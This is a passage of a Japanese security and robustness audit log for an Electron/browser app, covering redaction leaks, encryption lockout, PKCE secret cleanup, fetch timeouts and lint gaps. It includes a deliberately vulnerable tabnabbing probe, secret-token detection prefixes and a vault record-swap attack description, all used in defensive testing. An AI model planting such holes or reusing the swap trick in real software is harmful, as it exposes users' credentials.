(`openExternal` のスキーム検査 `ConditionalExpression → true`) を**手で当てて
確かめた**ところ、`webShimBridge.test.ts` の「それ以外のスキームは 1 つも開かない」
が**ちゃんと落ちた** —— つまり perTest の帰属ずれによる**偽の生存**だった。
生存の 119 件には同種の偽陽性が混ざっている。

生存の分布は 940〜1200 行に 103 件が集中していて、これは `invoke()` の
ディスパッチ (`if (serviceId === 'x' && action === 'y')` の連鎖) である。
デスクトップ版では同じ仕事を `clients/*.ts` がしていて、そちらは全部 100%。

**一覧には足していない。** 足せば `npm run mutate` が恒常的に赤になり、
「赤いのが当たり前」の状態は測っていないのと変わらない。config の注記自身が
「この注記は 2 度直している」「**『構造的に測れない』と書く前に、読み直す形を
試すこと**」と書いているので、**測れないのではなく、まだ測っていない**と記す。

### 続きの進め方 (未到達 1052 件の内訳)

| 関数 | 未到達 | 性質 |
|---|---|---|
| `shim` (invoke のディスパッチ) | 474 | 30 個ほどの action ルーティング。デスクトップ版では `clients/*.ts` が同じ仕事をしていて全部 100% |
| `callAnthropicAdvisor` / `callStocksAdvisor` | 202 | **API キーの送り先と送る中身**。送り先とヘッダは留めた |
| `callAssistantChat` / `ChatAll` | 159 | 同上 (送り先はまだ) |
| `callEmotionsAnalyze` | 74 | 同上 (送り先はまだ) |
| ~~`sanitizeAssistantTurns`~~ | ~~38~~ → 0 | 済 |
| `buildBusinessAnalysesForAdvisor` / `advisorSystemPrompt` | 49 | 送るプロンプトの組み立て |
| `saveToLibrary` / `tryGrabSvgFromPage` / `downloadBlob` ほか | 56 | 書き出し |

残りの効き目の順は **`callAssistantChat` / `callEmotionsAnalyze` の送り先 →
応答の取り出し → invoke のディスパッチ**。`business/advise` に置いた
「送り先 URL とヘッダを字面で留める」形がそのまま使える (テストは
`webShimCredentials.test.ts` の「API キーの送り先とヘッダ」節)。

### 伏字の合流点を通っていない失敗はあるか → 3 件あり、全部**資格情報の経路**だった

`redact.ts` の説明は「秘密を伏せる唯一の合流点 (17 箇所がここへ寄せてある)」、
`web-shim.ts` の `err()` は「ブラウザ版の**全ての失敗**が通る 1 本の口」と
書いている。どちらも今日まで**正確ではなかった**。

| 場所 | なぜ漏れていたか |
|---|---|
| `main.ts` の `secrets:set` | 13 本のハンドラで唯一、生の `e.message` を返していた |
| `web-shim.ts` の `setToken` | 戻り値が `TokenSaveResult` で `err()` を通らない |
| `web-shim.ts` の `clearToken` | 戻り値が `OsOpResult` で同上 |

3 件とも**資格情報が生きている経路**である。今日の実装が投げるのは fs /
IndexedDB のエラー (パスが載る程度) なので実害は小さいが、`safeErrorMessage` は
伏字に加えて**長さも切る** (2000 字) ので、片側だけ関門の外に居る意味は無い。

型が違うから通らなかった、というのが見つけにくかった理由 —— `err()` を使う
経路だけを見ていると「全部通っている」ように読める。

なお `secrets:set` は非 Error の throw を固定文言に潰していて、**検査の名前
(「文字列にして返す」) と期待値が食い違っていた**。他の 9 本は元から
`String(err)` を返しており、このハンドラ自身の説明も「弾いた理由を**返す**」
と書いている。`safeErrorMessage` へ寄せた時点で名前の側が正しくなった。

### 記録の暗号化は「ロックアウトしない」と書いてあったが、2 通りでロックアウトした

`recordEncryption.ts` の設計節はこう書いている ——「誤りなら **false を返すだけ**
(沈黙のデータ破壊をしない)。ユーザーは正しいパスフレーズを再入力すれば復帰できる」。

ところが鍵の導出 `deriveAesKey` が **try の外**に在り、2 通りで throw していた:

```
unlock  salt が base64 でない → THROW 暗号化データが壊れています（salt が base64…）
disable salt が base64 でない → THROW 同上
unlock  空パスフレーズ        → THROW パスワードを入力してください
```

`loadMeta` は `typeof m.salt === 'string'` しか見ていないので、localStorage の
salt が壊れているとここに落ちる。しかも **`disableEncryption` が同じ形**なので、
**解錠も解除もできない** —— 避けると宣言しているロックアウトそのもの。

`try` の中へ入れて契約どおり false を返すようにした。壊れた salt は誤パスフレーズと
同じ false になり理由は区別できないが、**利用者がやり直せる状態に留まる**方を採る
(throw だと打つ手が無くなる)。対照実験で 3 本落ちることを確認済み。

同じ形は `lint:ipc-handlers` の不変条件 #1 (「try の外で await しない」) が
IPC ハンドラに対しては止めている。**規則は在ったが、適用範囲の外だった。**

### レンダラーが渡す書き出し先は全部関門を通っていたか → 6 経路とも通っていた。閉包を機械で留めた

`ctx.payload` から書き出し先 `path` を受けているのは 4 クライアント (business /
stocks / templates / teamradar) の **6 経路**で、6 つとも `isSafeExportPath`
($HOME 配下・拡張子一致・制御文字なし・長さ上限) を通していた。**今日は穴が無い。**

穴だったのは、この 2 つを結んでいるものが何も無かったこと。書き出し action を
別のクライアントへ足した人が関門を知らなければ、その瞬間に**乗っ取られた
レンダラーが $HOME 配下の任意の場所へ書ける**ようになる (`shell.openPath` の
関門と対になる、書き込み側の入口)。

`lint:ipc-handlers` の不変条件 #4 として足した ——「`ctx.payload` から `path` を
取り出しているクライアントは `isSafeExportPath` を参照していること」。
判定はファイル単位で、「import はしたが 1 箇所で呼び忘れた」までは見ない
(狙いは**関門の存在を知らずに新しい経路を生やすこと**を止めること)。
陰性対照 6 本 + 実物の `teamradar.ts` から関門を外して鳴ることを確認した。

### 音声・チャットのコマンドは確認なしで実行されうるか → 今日は全部確認必須。閉包を機械で留めた

`requiresConfirmation` を見ている入口は **2 つ**あり、どちらも false のとき
**そのまま実行する**:

| 入口 | 実行のしかた |
|---|---|
| `VoiceCommandBar` | `phase === 'parsed'`（確認不要）を useEffect で**自動承認** |
| `ChatbotWidget` | `if (reply.needsConfirmation) 確認ボタン; else await runIntent(...)` |

チャット側は**マイクを要さない** —— 入力欄に打つだけで同じ経路を通る。
どちらも `routeCommand(parseVoiceCommand(text))` の結果をそのまま
`serviceHub.invoke(serviceId, action, params)` へ渡す。

発話から生まれうる action は `ACTION_RULES` の 6 つ（create-issue / send-message /
create-event / backup / record-entry / delete）で、6 つとも `CONFIRM_ACTIONS` に
載っていた。**今日は穴が無い。**

穴だったのは、その 2 つが**同じファイルの別々の手書きの表**で、何も結んで
いなかったこと。7 つ目の動詞ルールを `action: 'archive'` のような穏やかな名前で
足すと、`CONFIRM_ACTIONS` にも `DANGEROUS_STEMS`（delete/remove/send/pay/buy/
purchase/publish/destroy/create）にも当たらず、**その瞬間に無確認実行へ倒れる**。

`ACTION_RULES` から導出した `PARSEABLE_ACTIONS` を公開し、「発話から生まれうる
action は 1 つ残らず確認必須」を検査にした（対照実験: `archive` を足すと落ちる）。
`advise` のように確認不要な action が在ってよい設計は変えていない —— 縛るのは
**発話から到達できるもの**だけ。

### Electron の危ない webPreferences を全部止められていたか → 3 つ抜けていた

`lint:forbidden` は `nodeIntegration`(`InWorker` / `InSubFrames` 含む) /
`contextIsolation: false` / `sandbox: false` / `webSecurity: false` /
`allowRunningInsecureContent: true` を止めていたが、**5 つでは足りていなかった**。
実際の `main.ts` を読むと `webviewTag` は Electron の既定 (false) に依存して
いるだけで、明示的に禁じてはいなかった。

とくに `webviewTag` が効く: `<webview>` は**レンダラー側から作れる**ので、
main.ts が `win.webContents` に張った番人 (`setWindowOpenHandler` /
`will-navigate` / `will-redirect`) の**外側**に新しい webContents が生える。
窓を固めても、窓の中から別の窓を生やされたら意味が無い。

`webviewTag: true` / `experimentalFeatures: true` / `enableRemoteModule: true`
の 3 つを規則にした (現行の木では 3 つとも 0 件)。禁止パターンは 27 → 30。

`nodeIntegrationInWorker` / `nodeIntegrationInSubFrames` も別建てにしようとして、
**自己検査が「2 件鳴る」と教えてくれた** —— 既存の `nodeIntegration` 規則の
正規表現に既に含まれていた。二重に持つと 1 件の違反が 2 件に見えるので外した。

`app.on('web-contents-created')` で番人を全 webContents へ広げる案は**採らなかった**:
今日は `webviewTag` が false で窓も 1 つなので死んだコードになる。守りを増やす
より、**その設定を変えられなくする**方が確実で、規則ならそれができる。

### 同期 throw が主プロセスを落とす場所は他にあるか → 1 箇所だけで、直した

`uncaughtException` になりうるのは **`http.createServer` の listener の中の
同期 throw** で、`src/main/` 全体でその形は OAuth コールバック待受の 1 箇所だけ
だった（`ipcMain.handle` は戻り値が Promise なので、throw は reject として
renderer へ返る）。そこは try で囲んで 400（非終端）へ倒した。

**`process.on('uncaughtException')` は敢えて置いていない。** 置けばこの種の
事故は「落ちない」ようになるが、同時に **本来落ちるべき壊れ方を黙らせる**。
この repo は `LIVE_FETCHERS` の起動時不変条件のように「壊れていたら起動時に
大声で落とす」方針で通しているので、握り潰す受け皿を全体に敷くのは方針と
逆向きになる。入口を 1 つずつ塞ぐ方を採った。

### 表の添字を「所属判定」に使っている場所を洗った → 5 件直した

`in` は `lint:forbidden` #27 で止めたが、**`const x = TABLE[k]; if (!x) …`** は
別の形で残る。走査して 9 件、うち:

| 場所 | 判定 |
|---|---|
| `lint-workflow-security.cjs:128` `if (UNPINNED_ALLOW[ref])` | **直した** — `uses: constructor` で**未固定 action の検査ごと飛ばせた**（対照実験で確認） |
| `verify-knowledge-provenance.cjs:221` | **直した** — 未知の collection が「分類あり」で素通りしていた |
| `liveRead.ts:90` | **直した** — 2 行上の `canLiveRead` は正しかったのに本体だけ素。理由が `live_read_unsupported` でなく `not_configured`（＝「鍵を入れれば実データになる」）になっていた |
| `DocstudioPage.tsx:226` `KIND_BY_LABEL[kindLabel]` | **直した** — `values` は保存済みの書類 JSON なので画面の選択肢以外も入りうる |
| `mcp-check.cjs:64` | **直した** — 関数が返って `.filter` で TypeError |
| `oauth.ts:271` / `providers.ts:334` | 安全 — 上流の `isServiceId` / `AI_PROVIDER_IDS` (どちらも Set / includes) が済ませている |
| `web-shim.ts:629,691` | **走査の誤検出** — `if (!spec.browserDirect)` を `!spec` の判定と読んでいた。`resolveProvider` が `isAiProviderId` で検証済み |

**ゲートにはしなかった。** 走査の精度が 9 件中 2 件誤検出で、`in` の形（#27 は
現行木で誤検出 0）ほど絞り込めない。精度の低いゲートは鳴らし続けて無視される
のが最悪の結末なので、**直した 5 件それぞれに陰性対照を置く**方を採った
（`lint:workflow-security` と `verify:knowledge` は自己検査に、`liveRead` は
5 ケースのユニットテストに。3 つとも素の添字へ戻して落ちることを確認済み）。

### 2xx なのに JSON でない応答で、`res.json()` の例外に秘密が載るか → 載らない

`apiFetch` / `jsonFetch` は `!res.ok` の本文を `redactForMessage` で伏せているが、
**2xx で本文が JSON でない**場合の `res.json()` は素通しになる。実測すると
`SyntaxError` の文面に入るのは本文の**先頭 10 文字ほど**だけだった:

```
本文 "token=ghp_aaaa…"  → SyntaxError: Unexpected token 'o', "token=ghp_a"... is not valid JSON
本文 "<html>…ghp_…"     → SyntaxError: Unexpected token '<', "<html><bod"... is not valid JSON
```

40 字のトークンが使える形で出ることはない。`shared/api/http.ts` と
`main/clients/types.ts` の 2 実装も同じ振る舞いで、片方だけ緩いということも無かった。

### 正規表現に破滅的バックトラックはあるか → 無かった（実測）

`src/` + `scripts/` + `assets/` + `orchestration/` の正規表現リテラル **1247 件**
から、量化された group の中にさらに量化子がある形を機械で抜くと 7 件。
7 件とも内側が区切り文字（`.` / `・` / `,` / `-`）で始まるので**曖昧さが無く**、
バックトラックの分岐が生えない。

眺めて終わりにせず敵対的入力を食わせた（0-a-8）。とくに `redact.ts` の 2 本は
**あらゆる遠隔応答の本文に毎回かかる**ので、入力を倍にしながら測った:

```
redact:64 閉じ引用符の無い長い値   0.62 → 1.02 → 1.69 → 3.47 ms   倍率 1.6 / 1.6 / 2.1
redact:64 惜しい前置きの繰り返し   1.33 → 3.63 → 6.44 → 14.67 ms  倍率 2.7 / 1.8 / 2.3
redact:64 引用符違いで閉じない     0.25 → 0.35 → 0.75 → 1.81 ms   倍率 1.4 / 2.2 / 2.4
redact:74 空白なしの長い値         0.18 → 0.04 → 0.07 → 0.14 ms   倍率 0.2 / 1.9 / 2.0
```

入力 2 倍で時間も 2 倍＝**線形**。7 件すべての最悪でも 40 KB に対し 1.22 ms。

`redact.ts:64` の `(?:\\.|(?!\1)[^\\])*` が安全なのは、2 つの枝が
**排他**（片方は `\` で始まり、もう片方は `\` になり得ない）だから。
各位置で一致の仕方が 1 通りしかない。

### 書き出す HTML / SVG に素のまま埋めている外部文字列はあるか → 無かった

マークアップを組み立てている 303 箇所の `${…}` を全部読んだ。素のまま
埋まっているのは **数値・算術・内部で作った定数リテラル**だけだった:

- `width="${d.width}"` — 書式カタログの数値
- `fill="${p.accentColor}"` — `validateParams` が `#RRGGBB` 以外を throw 済み
- `style="color:${dir}"` / `background:${sigColor}` — `action === 'buy' ? '#22c55e' : …`
  の三項が返すリテラル
- `#${r.rank}` — AI アドバイザーの応答だが `Number.isFinite && >= 1` で検証済み

外部由来の文字列は例外なく `escapeXml(...)` を通っていた
（`w.symbol` / `w.signal.reason` / `t.ticker` / `r.rationale` / `r.categoryId` …）。

**ただしこれを強制するゲートは無い。** `lint:forbidden` #11 は
「エスケープ関数の再実装」を止めるだけで、「補間がエスケープを通ったか」は
見ていない。ゲートにしなかったのは、受理すべき補間が 300 件あって台帳が
実用にならないため —— 精度の低いゲートは、鳴らし続けて無視されるようになる
のが最悪の結末なので、**測った結果を残す**方を採った。
走査スクリプトの形は本項の記述で再現できる（マークアップ行の `${…}` を抜き、
`escapeXml|safeColor|toFixed|toLocaleString|Number\(|Math\.` 等を通ったものを除く）。

### プロトタイプ汚染の落とし口はあるか → 無かった

- `Object.assign(` は 3 箇所。うち外部データを混ぜうるのは
  `proxy.ts:530` の `Object.assign(flatHeaders, init.headers)` だけで、
  `init` は呼び出し側がコード上で組み立てる。しかも `Object.assign` の
  `__proto__` は**その 1 オブジェクトの原型を差し替える**だけで
  `Object.prototype` は汚れない（`[[Set]]` の対象が target であるため）。
- 解析済み JSON のキーを回して `obj[key] = value` する形は **0 件**。

### レコード単位の暗号化 (`recordCipher` / `dataCrypto`) に穴はあるか → 無かった

AES-GCM、封緘ごとに乱数 IV、鍵は `cryptoParams.ts` の PBKDF2 600k から導出、
保存側から読んだ反復回数は `assertKdfIterations` が範囲で弾く（格下げ防止）。
`decrypt` が平文を素通しするのは「暗号化を有効にする前のレコードを読む」ための
後方互換で、書ける相手は既に同一オリジンの JS を持っている＝脅威モデルの外。

Vault 側の `setToken` / `clearToken` も serviceId を型と長さ (1-64) で検証し、
保存先は IndexedDB のキー（プロトタイプ鎖が無い）。

> **⚠ 2026-08-24 追記 — この節の「穴は無かった」は、問うた範囲でのみ正しい。**
>
> ここで確かめたのは **serviceId が値として安全か** (型・長さ・プロトタイプ鎖) だった。
> 確かめていなかったのは **暗号文がその serviceId に束ねられているか** で、
> そちらには穴があった —— `github` のレコードを `slack` の位置へ移すと
> `getToken('slack')` が GitHub のトークンを返すことを実証している
> (この文書の「認証付き暗号は『中身が正しい』しか言わない」の節)。
> 対策 (AAD 束縛) は入れた。
>
> 上の「書ける相手は既に同一オリジンの JS を持っている＝脅威モデルの外」も、
> **vault には当てはまらない**。vault の鍵は `extractable: false` の
> メモリ保持なので、同一オリジンの JS を得ても**解錠されていなければ
> トークンは読めない**。一方レコードの付け替えは**施錠中でも成立し、
> しかもどの資格情報をどこへ送らせるかを攻撃者が選べる** —— 素の
> 同一オリジン JS より強い。`recordCipher` 側 (利用者自身のローカルレコード)
> についてはこの理屈で今も正しいが、**vault へ横展開してはいけない**。

### 出荷している Service Worker に穴はあるか → 無かった

network-first・**同一オリジンの GET のみ**・`res.ok` のときだけ保存、と
すでに 2026-07 監査で絞ってある。第三者 API の応答が端末に平文で残る経路は無い。

（説明文は「アプリシェルだけキャッシュすれば十分」と書いているが、実装は
同一オリジンの成功 GET を全部入れる。公開先は静的な Pages のオリジンで
利用者データを配っていないので実害は無い。文と実装のずれとしてだけ記す。）

---

## 優先順位の推奨

「自分で使いたい」が目的なら:

1. **Phase 0**（5 分）→ 即動かす
2. **Phase 2**（10 分）→ データを最新化して見やすく
3. **Phase 3**（30 分）→ ドックでアイコンが映える
4. **Phase 1**（30 分）→ main に取り込んで歴史を整理
5. **Phase 6**（OS 別 30 分）→ 自分の OS 向けインストーラ作る

ここまでで「個人ツールとして毎日使う」レベル。さらに「家族や友人にも配る」「公開する」
段階で Phase 4 / Phase 7 が必要になります。

### 中心の口に守りを入れても、その口を使っていない経路は守られない (2026-08-23)

前日 (2026-08-22) に `clients/types.ts` の `jsonFetch` へ**打ち切りと応答
サイズの上限**を入れ、`shared/httpLimits.ts` の冒頭にこう書いた:

> 残っていたのが `jsonFetch` で、**SaaS クライアント 74 本すべてがここを通る**。
> 1 か所直せば全部に効く

**通っていなかった。** ARCHITECTURE の payload 表を追っていて
`microsoft-365` の `send-mail` が**同じファイルの `create-event` と違って**
素の `fetch` を呼んでいるのに気づき、全経路を数え直したところ **6 つ**あった。

| 経路 | `jsonFetch` を避けた理由 | 実測 |
|---|---|---|
| `security` `check-email-breach` | HIBP は 404 が「侵害なし」という正常応答 | `signal: null` |
| `microsoft-365` `send-mail` | 202 Accepted・本文なし | `signal: null` |
| `shopify` `sync-to-discord` | webhook の 204 | `signal: null` |
| `business` `advise` | 有料 LLM API。失敗本文を自前で扱う | `signal: null` |
| `stocks` `advise` | 同上 | `signal: null` |
| `oauth` exchange / refresh | トークン交換 | `signal: null` |

#### 誤りは「本文を自分で扱う」を「打ち切りも自分で持つ」と取り違えたこと

`jsonFetch` を避ける理由はどれも**本文の扱い**にあり、そこは正しい ——
`jsonFetch` は必ず本文を読んで `JSON.parse` するので、204 や「404 が正常」に
は使えない。**だが打ち切りは本文の形に関係なく要る。** そこを
`limitedFetch` (打ち切り + `Content-Length` の先手の門 → `Response` を返す) と
`readCapped` (上限つきで本文を読む) に分け、`jsonFetch` はその上に載せ直した。

`business` / `stocks` は LLM 補完なので既定 30 秒ではなく
`AI_CHAT_TIMEOUT_MS` (2 分) を使う —— `shared/ai/chat.ts` と同じ値。

#### 実測で測る。実装からは見えない

「30 秒で落ちるか」を測ると 30 秒待つ検査になる。代わりに
**`init.signal` が渡っているか**を見る —— fetch を打ち切る手段は
`AbortSignal` しか無いので、この 2 つは同値で、しかも即座に決まる。
`main/clients/__tests__/fetchTimeouts.test.ts` が全経路 + `jsonFetch` の対照を
叩いて測る。対照実験: `send-mail` の守りを外すと**測定と字面の 2 つが同時に**
鳴り、戻すと 9 件すべて通る。

同ファイルに**字面の門**も置いた —— `?? fetch` を書いてよいのは
`clients/types.ts` と `ollama.ts` の 2 つだけ。実測は「今在る経路」しか
見ないので、新しい action が素の fetch を書いたら字面のほうが鳴る。

#### 鎖の除外台帳にも同じ嘘があった

`integrity-chain.cjs` は `src/main/clients/types.ts` を
**「型と ActionContext の形だけ。実行時の判断を持たない」**として
保護対象から除外していた。**前日の時点で嘘になっていた。**
`httpLimits.ts` (定数) は保護しているのに**それを適用する側**を保護しない
のは、金庫の鍵だけ固定して扉を固定しないのと同じ ——
`limitedFetch` から `declaredLengthExceeds` の 1 行を消すだけで上限が消える。
保護対象へ昇格 (35 → 36 ファイル) し、閉包で新たに要求された
`shared/advisorTypes.ts` は**本当に型だけ**なので除外へ入れた。

> **除外の理由は「型だけに見えるか」ではなく「実行時に残るか」で決める。**

#### モックが実物と違う形をしていると、検査はモックの挙動を留める

`business.test.ts` のモックは `json()` が payload を返すのに
`text()` が空文字を返していた —— **本物の `Response` ではありえない形**。
`readCapped` を通すようにした途端に 20 件落ちた。`stocks.test.ts` は最初から
本物の `Response` を使っていて、同じ変更で 1 件も落ちなかった。
`cursor.test.ts` で同じことがあったのと同型 (0-a-11)。

変異検査: `types.ts` は切り出し直後 62.50% (生存 5 / 未到達 7) まで落ちた ——
**既定と違う `maxBytes` / `timeoutMs` を渡す検査が 1 つも無かった**ため
(`??` を `&&` に変えた変異体は既定へ落ちるので、既定を渡している限り死なない)。
10 件足して `types.ts` / `httpLimits.ts` とも 100%。

### 「13 本のハンドラは全部通した」—— 数える単位が間違っていた (2026-08-23)

`docs/ARCHITECTURE.md` の統一原則 1:

> main から renderer に渡る **すべての error message** は
> `safeErrorMessage` → `redactSecrets` を必ず通す

`main.ts` にも「13 本のハンドラのうち、生の `e.message` を返していたのは
ここだけだった」と書いてある。**13 本すべての `message:` 欄は確かに通って
いた** (定数文字列と文字数の整数を除いて全部 `safeErrorMessage`)。

**数えていなかったのは「ハンドラが返す*データの中*に載る文言」である。**

| 口 | 載る場所 | 実測 |
|---|---|---|
| `action:invoke` | `assistant.chatAll` の `answers[].error` | `sk-ant-…` が**逐語で**届いた |
| `fetch:snapshot` | ollama スナップショットの `warnings[]` | 同上 |

`redactSecrets` は `sk-ant-` / `ghp_` / `xoxb-` を**知っている**。
呼ばれていなかっただけである。

`assistant.chatAll` は 5 プロバイダ (Anthropic / OpenAI / Gemini / Ollama /
OpenAI 互換の**利用者指定エンドポイント**) を並列に叩き、**どんな例外でも**
受けて `error` 欄へ載せる。`runAiChat` が投げる文言は既に
`redactForMessage` 済みだが、`configForProvider` や下位ライブラリ由来の例外は
そこを通らない。

#### 測り方 —— 実装を読むのではなく、秘密を投げて出口で探す

`main/__tests__/rendererBoundMessages.test.ts` は、秘密に見える文字列を含む
例外を投げる `fetch` を渡し、**返ってきた値を丸ごと `JSON.stringify` して
逐語検索する**。対照も 2 件置いた —— 伏字の対象でない印は**そのまま出てくる**
ので、「何も出ない経路を見ている」空虚な検査ではないことが分かる。

#### 検査の材料が、本物の走査器に引っ掛かってはいけない

最初は資格情報の形を字面のまま書いた。**GitHub の push protection が
「本物の Slack トークン」として push を拒んだ。** 許可してもらう方向へは
行かず、接頭辞を実行時に組み立てる形へ直した —— 検査に要るのは*形*であって
字面ではない。副産物として、この検査は**自己検証的**になった:
組み立てた値が `redactSecrets` の形と合っていなければ伏字が掛からず、
`not.toContain` がそのまま落ちる。

#### これは前項と同じ型である

前項 (打ち切りの 6 経路) と同じで、**census を 1 段浅い単位で取った**ために
漏れた。あちらは「`jsonFetch` を使っている場所」を数えて
「同じことをしている場所」を数えなかった。こちらは「ハンドラ」を数えて
「外へ出る値」を数えなかった。

> **数える単位は、守りたいものの単位に合わせる。**
> 守りたいのは「ハンドラ」でも「関数の呼び出し」でもなく、
> **プロセスの境界を越える値**である。

### PKCE の一時秘密が、失敗したときだけ残っていた (2026-08-23)

`vault.ts` の不変条件はこう書いてある:

> 平文 secret は IndexedDB / localStorage / sessionStorage どこにも書かない

この主張を「守っている関数」ではなく **「保管庫へ入る値」**の側から数え直した
(前 2 項と同じ軸)。`sessionStorage` への書き込みは 4 つあり、全部
`SettingsPage.tsx` に直書きされた `pkce.*` だった。

`code_verifier` は RFC 7636 の言うとおり**秘密**である —— 認可コードと組で
握られると、そのままトークン交換を完了できる。`file://` で動くブラウザ版には
置き場所が `sessionStorage` しか無いので置くこと自体は正しい。**消えることが
要る。** 消えていなかった:

```
  complete() の try の中で 4 つ removeItem   ← 交換が成功したときだけ走る
  finally は setBusy(false) だけ
  キャンセルボタンは pkce.verifier だけ消す  ← 残り 3 つが残る
```

**`state` 不一致 —— つまり CSRF の疑いで `exchangeGoogleCode` が投げたとき、
いちばん消したい verifier が残った。** トークン端点の 4xx・通信断・
`setToken` の失敗でも同じ。成功時には消えるので、通常操作では気付かない。

#### 直し方 —— 扉を 1 つにする

`oauth/pkceSession.ts` を作り、4 つの鍵を知っているのはそこだけにした
(`externalUrlGate.ts` で `shell.openExternal` にやったのと同じ形)。

- `clearPkceSession()` は**全部消す**。一部だけ消す関数は置かない ——
  「3 つ消して 1 つ残る」形を作れなくする
- `readPkceSession()` は **1 つでも欠けたら `null`**。途中まで残った状態で
  交換を試させない (欠けた鍵だけ古い値で埋まると、別のセッションの state で
  CSRF 検査を通しかねない)
- 呼び出し側は `finally` から呼ぶ

検査は「`finally` に書いてあるか」を字面で見るのではなく、**例外を通してから
保管庫を覗く**。`runLikeComplete` は `complete()` と同じ制御の流れの最小再現で、
*直した形*と*直す前の形*の両方を持つ —— 後者は 4 つとも残ることを直接見せる。
`pkce.` の直書きが他に無いことも走査で留めた (走査自体が動いていることも
別途確認)。

#### ついでに直した —— トークン交換にも打ち切りが無かった

`exchangeGoogleCode` は素の `fetch` で、兄弟の `network/proxy.ts` が掛けている
打ち切りも応答サイズの上限も無かった。今朝の 6 経路と同じ型なので同じ形で直した。

### 手作りの `Response` が矛盾している —— 3 度目なのでゲートにした

`json()` が中身を返すのに `text()` が空文字を返すモックで、**同じセッション中に
2 度足を取られた** (`business.test.ts` 20 件 / `pkce` 2 ファイル 23 件)。
`cursor.test.ts` の件を入れると 3 度目である。本物の `Response` は 1 つの body を
2 通りに読ませるだけなので、**この 2 つが食い違うことはありえない**。

実装が `res.json()` を使っている間は誰も気付かない。**本文の読み方を変えた
瞬間に落ちる** —— 実装の不具合ではなく、検査がモックの挙動を留めていたために。

#### なぜ「両方定義している」で鳴らさないのか

それだと**辻褄の合ったモックまで鳴る** (`text()` が `json()` から導かれている
物は正しい)。受理すべき対象が並ぶゲートは鳴らし続けて無視されるので作らない。
**`text()` が空文字を返す**ことだけを見る —— 中身のある `json()` と並んだ時点で
無条件に矛盾で、直し方も 1 つ (`new Response(...)`)。

実測: 約 340 の検査ファイルに対し誤検知 0。`proxy.test.ts` の
`async text() { return ''; }` は**正しく素通しした** —— あちらは「本文が空なら
502」を試す意図的な上書きで、矛盾する `json()` が無い。

#### 自分の検査ファイル自身も走査の対象に残した

陰性対照の表に書いた例が、実物走査に引っ掛かった。ファイルごと除外すれば済むが、
それは「ファイルのどこかに在るか」で免除する形 (0-a-17) で、**この検査ファイルに
本物の悪いモックを書いても鳴らなくなる**。キャストの字面を実行時に組み立てて
割り、走査の対象のままにした (今朝 push protection を避けたのと同じ手)。

### 文書の action 名が実在しなかった —— 自分で作ったゲートの死角 (2026-08-23)

呼び出し側から数える軸を続け、**「画面が invoke する action 名」**を
両ビルドの登録簿と突き合わせた。結果としてコードは 3 者
(`WordPressPage` / main / web-shim) すべて `create-post-draft` で一致しており、
**食い違っていたのは文書だけ**だった:

```
  docs/ARCHITECTURE.md  wordpress `create-post`        ← 2 か所
  実物                  wordpress `create-post-draft`
```

#### なぜ前日のゲートが捕まえなかったか

昨日足した `verifyActionPayloads` は、**文書に書かれた action 名から
interface 名を導く** (`create-post` → `CreatePostPayload`)。
実装側の interface が**古い名前のまま** `CreatePostPayload` だったので、
**payload の比較は成功し、名前が違うまま通った。**

> **導出の材料が間違っているとき、導出の結果が一致しても意味が無い。**

さらに悪いことに、interface が見つからない行は `continue` で**黙って
飛ばして**いた —— 文書がいちばん間違っているとき (名前が違う) にこそ
検査対象から外れる形である。実測すると 1 行 (`atlassian.create-issue`) が
黙って飛ばされていた。

#### 直したこと

1. 文書の 2 か所を `create-post-draft` へ。interface も
   `CreatePostDraftPayload` へ改名して導出が効くようにした
2. **action 名そのものの実在検査**を追加 —— 実物の `ACTIONS` を読んで
   突き合わせる。`'k': fn` / `k: fn` / **短縮記法 `fn,`** の 3 通りを拾う
   (短縮記法を落とすと `ollama.chat` が「実在しない」に見える。
   実際に一度そう誤読した)
3. **黙って飛ばすのをやめた。** 別名は `PAYLOAD_INTERFACE_OVERRIDES` に
   **理由つきで**登録する (今は `atlassian.create-issue` の 1 件だけ)。
   検査対象が 18 → **19 行**へ増えた
4. 自己検査を 7 → **11 件**。対照実験も実物の木で確認 ——
   名前を戻すと `L1739: wordpress.create-post — そんな action は登録されていません`

#### 併せて測った、鳴らなかったもの (清算)

同じ軸で当たって**穴が無かった**もの。次の人が同じ場所を掘らないために残す。

| 調べたこと | 結果 |
|---|---|
| `main` の log 出力 6 か所に資格情報が載るか | **載らない。** 定数 + パス + バイト数のみ。`main.ts:212` は `safeErrorMessage` 経由 |
| ブラウザ版 Gmail の `To:` ヘッダ注入 | **守られている。** `saasWriteWeb.buildRfc2822` が CR/LF/NUL を弾く (main とは別実装・パリティ検査あり) |
| ブラウザ版 `scan-url` の SSRF | **守られている。** 共有の `validateScanUrl` を通す |
| Ollama エンドポイント設定の読み手 | **2 経路とも `parseOllamaEndpoint` を通る** (`probeOllama` / `chatOllama`) |
| main の action と web-shim の実装差 15 件 | **意図どおり** (ファイル書き出し・skills・microsoft-365 等のデスクトップ専用) |

### 例外のあるファイルは、その規則から丸ごと外れていた (2026-08-23)

前項で「自分の作ったゲートに死角があった」ので、**他のゲートも同じ形で
壊れていないか**を見た。狙いは *「文書・台帳から導いた鍵で引いて、
外れたら黙って通す」* 形である。

`lint:forbidden` の例外台帳 (`KNOWN_SUPPRESSIONS`) は既に**双方向**だった ——
台帳に無い例外が効けば鳴り、台帳にあるのに効かなくても鳴る。設計は正しい。
**粒度が間違っていた。** 鍵が `規則名 :: パス` なので、

> **例外の効いているファイルは、その規則から丸ごと外れる。**

#### 実測

`window.open :: src/renderer/web-shim.ts` の例外がある `web-shim.ts` へ、
**`noopener` 無しで任意の URL を開く新しい `window.open` を足した**:

```ts
export function probeOpen(u: string): void { window.open(u, "_blank"); }
```

`lint:forbidden` は **緑のまま**通った。既存の 1 件が例外に載っているので、
2 件目も同じ例外に覆われる。`noopener` が無いと開かれた側から
`window.opener` でこちらを触れる (reverse tabnabbing) が、誰も鳴らない。

これは 0-a-17 (「ファイルのどこかに在るか」で判定する検査は同居で
無効化される) の**ゲート自身での再演**である。

#### 直したこと

鍵を `規則名 :: パス :: 件数` にした。例外のあるファイルで違反が増えれば
件数が変わり、`added` と `gone` が同時に立つ (旧件数と新件数が並んで出るので
何が増えたか読める)。

台帳の突き合わせ自体の自己検査が**1 件も無かった**ので (表は「1 行が
パターンに当たるか」しか見ていなかった)、`diffSuppressions` を切り出して
6 件足した。うち 1 件は**対照** —— 件数を無視する鍵なら見逃すことを直接示す。

対照実験 2 本:

- 例外のあるファイルへ違反を足す → `window.open :: … :: 2` と `:: 1` が並んで鳴る
- 例外の無いファイルへ違反を足す → 従来どおり鳴る (壊していない)

#### 残る隙間 (正直に書く)

